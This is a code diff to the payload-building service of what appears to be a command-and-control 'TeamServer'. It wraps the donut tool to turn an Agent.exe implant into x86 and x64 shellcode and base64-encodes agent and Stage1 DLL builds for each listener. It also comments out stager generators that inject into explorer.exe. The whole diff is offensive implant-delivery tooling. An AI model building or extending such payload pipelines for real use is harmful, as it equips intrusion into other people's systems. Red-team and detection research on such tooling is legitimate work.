@@ -18,6 +18,13 @@ namespace TeamServer.Services
         private readonly IConfiguration _configuration;
         private readonly ILoggerFactory _loggerFactory;
         private readonly ILogger _logger;
+
+        public const string BinExtension = ".bin";
+        public const string Base64Extension = ".b64";
+        public const string X86Suffix = "-x86";
+        public const string AgentFileName = "Agent.exe";
+        public const string Stage1FileName = "Stage1.dll";
+
         public BinMakerService(IFileService fileService, IConfiguration configuration, ILoggerFactory loggerFactory)
         {
             _fileService = fileService;
@@ -29,12 +36,13 @@ namespace TeamServer.Services
 
         public string DonutFolder => _configuration.GetValue<string>("DonutFolder");
         public string ReaNimatorFolder => _configuration.GetValue<string>("ReaNimatorFolder");
-        public string GeneratedAgentBinFileName => _configuration.GetValue<string>("GeneratedAgentBinFileName");
-        public string GeneratedAgentB64FileName => _configuration.GetValue<string>("GeneratedAgentB64FileName");
-        public string GeneratedAgentExeFileName => _configuration.GetValue<string>("GeneratedAgentExeFileName");
-        public string GeneratedAgentDllFileName => _configuration.GetValue<string>("GeneratedAgentDllFileName");
 
-        public string SourceAgentExePath => _configuration.GetValue<string>("SourceAgentExePath");
+        public string SourcePath => _configuration.GetValue<string>("SourcePath");
+
+        private string GetX86FileName(string fileName)
+        {
+            return Path.Combine(Path.GetDirectoryName(fileName), Path.GetFileNameWithoutExtension(fileName) + X86Suffix + Path.GetExtension(fileName));
+        }
 
         //public string GenerateStagersFor(Listener listener)
         //{
@@ -43,11 +51,21 @@ namespace TeamServer.Services
         //    return gen;
         //}
 
-        public string GenerateBin(Listener listener)
+        public string GenerateBins(Listener listener)
+        {
+            _logger.LogInformation($"Generate Bin files !");
+            var res = GenerateBin(listener, true);
+            res += GenerateBin(listener);
+            return res;
+        }
+
+        public string GenerateBin(Listener listener, bool x86 = false)
         {
             var cmd = Path.Combine(DonutFolder, "donut");
-            var inputFile = this.SourceAgentExePath;
-            var outFile = Path.Combine(this._fileService.GetListenerPath(listener.Name), this.GeneratedAgentBinFileName);
+            var inputFile = Path.Combine(this.SourcePath, AgentFileName);
+            if (x86)
+                inputFile = GetX86FileName(inputFile);
+            var outFile = Path.Combine(this._fileService.GetListenerPath(listener.Name), Path.GetFileNameWithoutExtension(inputFile) + BinExtension);
 
             if (!Directory.Exists(this._fileService.GetListenerPath(listener.Name)))
                 Directory.CreateDirectory(this._fileService.GetListenerPath(listener.Name));
@@ -55,7 +73,10 @@ namespace TeamServer.Services
             List<string> args = new List<string>();
             args.Add(inputFile);
             args.Add("-f 1");
-            args.Add("-a 2");
+            if(x86)
+                args.Add("-a 1");
+            else
+                args.Add("-a 2");
             args.Add($"-o");
             args.Add(outFile);
             args.Add($"-p");
@@ -68,84 +89,98 @@ namespace TeamServer.Services
         }
 
 
-        public void GenerateB64(Listener listener)
+        public void GenerateB64s(Listener listener)
         {
-            byte[] bytes = File.ReadAllBytes(this.SourceAgentExePath);
+            _logger.LogInformation($"Generate base64 files !");
+            GenerateB64(listener, AgentFileName, true);
+            GenerateB64(listener, AgentFileName);
+            GenerateB64(listener, Stage1FileName, true);
+            GenerateB64(listener, Stage1FileName);
+        }
+
+        public void GenerateB64(Listener listener, string sourceFile, bool x86 = false)
+        {
+            var inputFile = Path.Combine(this.SourcePath, sourceFile);
+            if (x86)
+                inputFile = GetX86FileName(inputFile);
+
+            byte[] bytes = File.ReadAllBytes(inputFile);
             string base64 = Convert.ToBase64String(bytes);
-            var outFile = Path.Combine(this._fileService.GetListenerPath(listener.Name), this.GeneratedAgentB64FileName);
+            var outFile = Path.Combine(this._fileService.GetListenerPath(listener.Name), Path.GetFileNameWithoutExtension(inputFile) + Base64Extension);
+            _logger.LogInformation($"Encoding base64 :  {inputFile} => {outFile}");
             File.WriteAllText(outFile, base64);
             
         }
 
-        public string GenerateExeStager(Listener listener)
-        {
-            var res = GenerateBin(listener);
-            res += Environment.NewLine;
-            res += GenerateExeStagerFromBin(listener);
-            return res;
-        }
+        //public string GenerateExeStager(Listener listener)
+        //{
+        //    var res = GenerateBin(listener);
+        //    res += Environment.NewLine;
+        //    res += GenerateExeStagerFromBin(listener);
+        //    return res;
+        //}
 
-        public string GenerateDllStager(Listener listener)
-        {
-            var res = GenerateBin(listener);
-            res += Environment.NewLine;
-            res += GenerateDllStagerFromBin(listener);
-            return res;
-        }
-        public string GenerateExeStagerFromBin(Listener listener)
-        {
-            var cmd = Path.Combine(ReaNimatorFolder, "reaNimator");
-            var inputFile = Path.Combine(this._fileService.GetListenerPath(listener.Name), this.GeneratedAgentBinFileName);
-            var outFile = Path.Combine(this._fileService.GetListenerPath(listener.Name), this.GeneratedAgentExeFileName);
+        //public string GenerateDllStager(Listener listener)
+        //{
+        //    var res = GenerateBin(listener);
+        //    res += Environment.NewLine;
+        //    res += GenerateDllStagerFromBin(listener);
+        //    return res;
+        //}
+        //public string GenerateExeStagerFromBin(Listener listener)
+        //{
+        //    var cmd = Path.Combine(ReaNimatorFolder, "reaNimator");
+        //    var inputFile = Path.Combine(this._fileService.GetListenerPath(listener.Name), this.GeneratedAgentBinFileName);
+        //    var outFile = Path.Combine(this._fileService.GetListenerPath(listener.Name), this.GeneratedAgentExeFileName);
 
-            if (!Directory.Exists(this._fileService.GetListenerPath(listener.Name)))
-                Directory.CreateDirectory(this._fileService.GetListenerPath(listener.Name));
+        //    if (!Directory.Exists(this._fileService.GetListenerPath(listener.Name)))
+        //        Directory.CreateDirectory(this._fileService.GetListenerPath(listener.Name));
 
-            List<string> args = new List<string>();
-            args.Add("-f");
-            args.Add(inputFile);
-            args.Add("-t");
-            args.Add("raw");
-            args.Add($"-o");
-            args.Add(outFile);
-            args.Add($"-e");
-            args.Add($"-u");
-            args.Add($"-p");
-            args.Add($"explorer.exe");
+        //    List<string> args = new List<string>();
+        //    args.Add("-f");
+        //    args.Add(inputFile);
+        //    args.Add("-t");
+        //    args.Add("raw");
+        //    args.Add($"-o");
+        //    args.Add(outFile);
+        //    args.Add($"-e");
+        //    args.Add($"-u");
+        //    args.Add($"-p");
+        //    args.Add($"explorer.exe");
 
-            //reaNimator -f /Share/tmp/Stager/agent.bin -t raw -o /Share/tmp/Stager/TestSelf.exe -e -u -p "explorer.exe"
-            _logger.LogInformation($"Executing {cmd} {string.Join(' ', args)}");
-            var ret = ExecuteCommand(cmd, args, this.ReaNimatorFolder);
-            return ret;
-        }
+        //    //reaNimator -f /Share/tmp/Stager/agent.bin -t raw -o /Share/tmp/Stager/TestSelf.exe -e -u -p "explorer.exe"
+        //    _logger.LogInformation($"Executing {cmd} {string.Join(' ', args)}");
+        //    var ret = ExecuteCommand(cmd, args, this.ReaNimatorFolder);
+        //    return ret;
+        //}
 
-        public string GenerateDllStagerFromBin(Listener listener)
-        {
-            var cmd = Path.Combine(ReaNimatorFolder, "reaNimator");
-            var inputFile = Path.Combine(this._fileService.GetListenerPath(listener.Name), this.GeneratedAgentBinFileName);
-            var outFile = Path.Combine(this._fileService.GetListenerPath(listener.Name), this.GeneratedAgentDllFileName);
+        //public string GenerateDllStagerFromBin(Listener listener)
+        //{
+        //    var cmd = Path.Combine(ReaNimatorFolder, "reaNimator");
+        //    var inputFile = Path.Combine(this._fileService.GetListenerPath(listener.Name), this.GeneratedAgentBinFileName);
+        //    var outFile = Path.Combine(this._fileService.GetListenerPath(listener.Name), this.GeneratedAgentDllFileName);
 
-            if (!Directory.Exists(this._fileService.GetListenerPath(listener.Name)))
-                Directory.CreateDirectory(this._fileService.GetListenerPath(listener.Name));
+        //    if (!Directory.Exists(this._fileService.GetListenerPath(listener.Name)))
+        //        Directory.CreateDirectory(this._fileService.GetListenerPath(listener.Name));
 
-            List<string> args = new List<string>();
-            args.Add("-f");
-            args.Add(inputFile);
-            args.Add("-t");
-            args.Add("raw");
-            args.Add($"-o");
-            args.Add(outFile);
-            args.Add($"-e");
-            args.Add($"-u");
-            args.Add($"-b");
-            args.Add($"-p");
-            args.Add($"explorer.exe");
+        //    List<string> args = new List<string>();
+        //    args.Add("-f");
+        //    args.Add(inputFile);
+        //    args.Add("-t");
+        //    args.Add("raw");
+        //    args.Add($"-o");
+        //    args.Add(outFile);
+        //    args.Add($"-e");
+        //    args.Add($"-u");
+        //    args.Add($"-b");
+        //    args.Add($"-p");
+        //    args.Add($"explorer.exe");
 
-            //reaNimator -f /Share/tmp/Stager/agent.bin -t raw -o /Share/tmp/Stager/TestSelf.exe -e -u -p "explorer.exe"
-            _logger.LogInformation($"Executing {cmd} {string.Join(' ', args)}");
-            var ret = ExecuteCommand(cmd, args, this.ReaNimatorFolder);
-            return ret;
-        }
+        //    //reaNimator -f /Share/tmp/Stager/agent.bin -t raw -o /Share/tmp/Stager/TestSelf.exe -e -u -p "explorer.exe"
+        //    _logger.LogInformation($"Executing {cmd} {string.Join(' ', args)}");
+        //    var ret = ExecuteCommand(cmd, args, this.ReaNimatorFolder);
+        //    return ret;
+        //}
 
         public string ExecuteCommand(string fileName, List<string> args, string startIn)
         {
